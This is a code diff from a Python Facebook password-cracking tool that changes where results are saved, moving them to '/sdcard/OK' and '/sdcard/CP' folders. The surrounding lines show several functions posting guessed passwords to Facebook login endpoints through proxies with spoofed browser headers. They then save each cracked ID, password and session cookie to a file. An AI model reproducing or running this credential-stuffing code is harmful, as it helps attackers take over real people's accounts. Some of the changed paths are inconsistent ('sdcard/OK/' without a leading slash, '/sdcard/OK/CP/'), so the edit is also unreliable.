@@ -1468,7 +1468,7 @@ def metod1(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1476,7 +1476,7 @@ def metod1(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -1521,7 +1521,7 @@ def metod2(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('CP/'+cph,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				ceker(idf,pw)
 				cp+=1
 				break
@@ -1530,7 +1530,7 @@ def metod2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
 				
@@ -1556,7 +1556,7 @@ def metod3(idf,pwv):
 			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/OK/CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 				ceker(idf,pw)
 				cp+=1
@@ -1566,7 +1566,7 @@ def metod3(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -1591,7 +1591,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1600,7 +1600,7 @@ def crackfree(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -1644,7 +1644,7 @@ def crackmobile(idf,pwv):
 			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1653,7 +1653,7 @@ def crackmobile(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -1662,8 +1662,8 @@ def crackmobile(idf,pwv):
 			waktu(31)
 	loop+=1
 if __name__=='__main__':
-	try:os.mkdir('OK')
+	try:os.mkdir('/sdcard/OK')
 	except:pass
-	try:os.mkdir('CP')
+	try:os.mkdir('/sdcard/CP')
 	except:pass
 	brayenlogin()
